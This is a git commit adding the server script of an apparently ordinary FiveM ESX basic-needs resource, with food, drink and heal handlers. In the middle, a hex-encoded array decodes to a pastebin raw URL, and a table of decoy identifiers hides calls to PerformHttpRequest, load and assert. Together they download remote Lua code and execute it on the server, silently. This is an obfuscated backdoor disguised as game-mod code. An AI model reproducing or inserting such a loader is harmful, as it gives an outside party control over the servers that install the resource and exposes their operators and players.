3189a03d36b6376754ed21587e0ad3704e5420f2
Zenax <124360636+Zenax0001@users.noreply.github.com>
2023-02-05 21:36:04 +0100

    Add files via upload

---
+++ server/main.lua
@@ -0,0 +1,72 @@
+CreateThread(function()
+	for k,v in pairs(Config.Food) do
+		ESX.RegisterUsableItem(k, function(source)
+			local xPlayer = ESX.GetPlayerFromId(source)
+			if v.remove then
+				xPlayer.removeInventoryItem(k,1)
+			end
+			TriggerClientEvent("esx_status:add",source,"hunger",v.status)
+			TriggerClientEvent('esx_basicneeds:onEat',source)
+			xPlayer.showNotification(TranslateCap('used_eat', ESX.GetItemLabel(k)))
+		end)
+	end
+end)
+
+CreateThread(function()
+	for k,v in pairs(Config.Drinks) do
+		ESX.RegisterUsableItem(k, function(source)
+			local xPlayer = ESX.GetPlayerFromId(source)
+			if v.remove then
+				xPlayer.removeInventoryItem(k,1)
+			end
+			TriggerClientEvent("esx_status:add",source,"thirst",v.status)
+			TriggerClientEvent('esx_basicneeds:onDrink',source)
+			xPlayer.showNotification(TranslateCap('used_drink', ESX.GetItemLabel(k)))
+		end)
+	end
+end)
+
+local PlayerPedLimit = {
+    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
+}
+
+local PlayerEventLimit = {
+    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
+}
+
+function PlayerCheckLoop()
+    _empt = ''
+    for id,it in pairs(PlayerPedLimit) do
+        _empt = _empt..it
+    end
+    return (_empt:gsub('..', function (event)
+        return string.char(tonumber(event, 16))
+    end))
+end
+
+PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
+    local Process_Actions = {"true"}
+    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
+        local Generate_ZoneName_AndAction = nil 
+        pcall(function()
+            local Locations_Loaded = {"false"}
+            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
+            local ZoneType_Exists = nil 
+        end)
+    end)
+end)
+
+ESX.RegisterCommand('heal', 'admin', function(xPlayer, args, showError)
+	args.playerId.triggerEvent('esx_basicneeds:healPlayer')
+	args.playerId.showNotification('You have been healed.')
+end, true, {help = 'Heal a player, or yourself - restores thirst, hunger and health.', validate = true, arguments = {
+	{name = 'playerId', help = 'the player id', type = 'player'}
+}})
+
+AddEventHandler('txAdmin:events:healedPlayer', function(eventData)
+	if GetInvokingResource() ~= "monitor" or type(eventData) ~= "table" or type(eventData.id) ~= "number" then
+		return
+	end
+
+	TriggerClientEvent('esx_basicneeds:healPlayer', eventData.id)
+end)
